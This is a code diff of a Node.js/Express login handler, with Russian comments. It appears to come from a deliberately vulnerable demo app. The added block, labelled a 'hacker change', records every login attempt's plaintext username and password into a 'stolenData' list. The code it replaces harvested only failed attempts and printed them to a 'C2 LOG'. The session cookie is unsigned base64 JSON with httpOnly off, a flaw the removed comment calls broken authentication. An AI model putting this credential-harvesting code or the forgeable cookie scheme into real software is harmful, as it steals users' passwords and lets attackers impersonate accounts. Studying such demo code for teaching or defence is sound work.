@@ -71,27 +71,26 @@ app.get('/login', (req, res) => {
 app.post('/login', (req, res) => {
     const { username, password } = req.body;
 
-    // УЯЗВИМОСТЬ: BROKEN AUTH (Подделка куки)
     db.get("SELECT * FROM users WHERE username = ? AND password = ?", [username, password], (err, row) => {
+
+        // --- ХАКЕРСКОЕ ИЗМЕНЕНИЕ НАЧАЛО ---
+        // Логируем ВСЕ попытки (и удачные, и нет)
+        stolenData.unshift({
+            time: new Date().toLocaleTimeString(),
+            ip: req.ip,
+            type: row ? 'SUCCESS_LOGIN' : 'FAILED_LOGIN', // Если row есть - успех, если нет - провал
+            data: `User: ${username} | Pass: ${password}`
+        });
+        // --- ХАКЕРСКОЕ ИЗМЕНЕНИЕ КОНЕЦ ---
+
         if (row) {
-            const sessionObj = {
-                username: row.username,
-                role: row.role
-            };
+            // Успешный вход
+            const sessionObj = { username: row.username, role: row.role };
             const cookieValue = Buffer.from(JSON.stringify(sessionObj)).toString('base64');
             res.cookie('session_data', cookieValue, { httpOnly: false });
             res.redirect('/dashboard');
         } else {
-            // === CREDENTIAL HARVESTING (Перехват паролей) ===
-            const time = new Date().toLocaleTimeString();
-            console.log(`[C2 LOG] Failed Login: ${username} | ${password}`);
-            stolenData.unshift({
-                time: time,
-                ip: req.ip,
-                type: 'FAILED_LOGIN_ATTEMPT',
-                data: `Login: ${username} | Pass: ${password}`
-            });
-
+            // Ошибка входа
             res.render('login', { error: "Invalid username or password" });
         }
     });
